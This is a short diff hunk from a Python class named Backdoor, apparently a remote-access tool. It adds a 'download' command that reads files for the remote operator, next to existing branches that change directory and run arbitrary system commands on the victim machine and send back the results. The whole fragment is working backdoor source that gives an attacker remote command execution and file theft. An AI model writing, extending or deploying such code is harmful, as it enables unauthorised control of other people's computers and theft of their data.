@@ -42,6 +42,8 @@ class Backdoor:
                 exit()
             elif command[0] == "cd" and len(command) > 1:
                 command_result = self.change_working_dir(command[1])
+            elif command[0] == "download":
+                command_result = self.read_file(command)
             else:
                 command_result = self.execute_system_command(command)
                 self.reliable_send(command_result)
